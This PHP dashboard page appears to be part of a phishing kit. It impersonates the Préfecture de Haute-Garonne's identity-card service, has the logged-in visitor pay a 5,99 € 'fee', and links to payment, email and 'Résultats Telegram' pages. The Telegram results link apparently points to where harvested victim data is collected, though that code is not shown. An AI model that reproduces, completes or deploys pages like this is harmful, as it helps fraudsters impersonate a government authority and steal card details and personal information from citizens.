<?php
session_start();

if (!isset($_SESSION['user_id'])) {
    header('Location: login.php');
    exit();
}

// Retrieve user info from session
$userId   = $_SESSION['user_id'] ?? 'unknown';
$userName = $_SESSION['user_name'] ?? 'Guest';

// Optional: fetch payment status or other user-specific data
$paymentStatus = $_SESSION['payment_status'] ?? 'pending';
?>

<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Tableau de bord – Service de réception de carte d'identité</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { background: #f8f9fa; }
        .sidebar { width: 250px; position: fixed; height: 100vh; background: #2c3e50; padding-top: 2rem; }
        .sidebar a { color: #ecf0f1; text-decoration: none; }
        .sidebar .nav-link { display: block; padding: 0.75rem 1rem; }
        .sidebar .nav-link:hover { background: #34495e; }
        .content { margin-left: 260px; padding: 2rem; }
        .card-icon { font-size: 2rem; }
        .card { cursor: pointer; transition: transform 0.2s; }
        .card:hover { transform: translateY(-4px); }
    </style>
</head>
<body>
    <!-- Sidebar -->
    <nav class="sidebar">
        <div class="mb-3 text-center">
            <strong style="font-size:1.4rem;color:#ecf0f1;">Préfecture de Haute-Garonne</strong>
        </div>
        <ul class="nav flex-column">
            <li class="nav-item"><a href="index.php" class="nav-link">Accueil</a></li>
            <li class="nav-item"><a href="login.php" class="nav-link">Déconnexion</a></li>
            <?php if ($paymentStatus !== 'completed'): ?>
                <li class="nav-item"><a href="payment.php" class="nav-link">Paiement de frais</a></li>
            <?php else: ?>
                <li class="nav-item"><a href="verify.php" class="nav-link">Vérification du paiement</a></li>
            <?php endif; ?>
            <li class="nav-item"><a href="email.php" class="nav-link">Envoyer la lettre par email</a></li>
            <li class="nav-item"><a href="telegram.php" class="nav-link">Résultats Telegram</a></li>
        </ul>
    </nav>

    <!-- Main content -->
    <main class="content">
        <h1 class="mb-4">Bienvenue, <span style="color:#28a745;"><?= htmlspecialchars($userName) ?></span> !</h1>
        <p class="lead">Vous êtes authentifié avec succès.</p>

        <?php if ($paymentStatus === 'completed'): ?>
            <div class="alert alert-success" role="alert">
                <strong class="me-2">Paiement effectué&nbsp;!</strong>Votre frais de <strong>5,99 €</strong> a été reçu. Vous pouvez maintenant procéder à la vérification ou commander l’envoi de votre lettre par email.
            </div>
        <?php else: ?>
            <div class="card mb-4" id="paymentCard" style="max-width: 300px;">
                <div class="card-body text-center">
                    <span class="card-icon">💳</span>
                    <h5 class="card-title">Paiement des frais</h5>
                    <p class="card-text">Cliquez pour initier le paiement de <strong>5,99 €</strong>.</p>
                </div>
            </div>
        <?php endif; ?>

        <?php if ($paymentStatus !== 'completed'): ?>
            <script>
                document.getElementById('paymentCard').addEventListener('click', function() {
                    window.location.href = 'payment.php';
                });
            </script>
        <?php endif; ?>

        <hr class="my-5">

        <footer class="text-muted small">
            © <?= date('Y') ?> Préfecture de Haute-Garonne – Tous droits réservés.
        </footer>
    </main>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>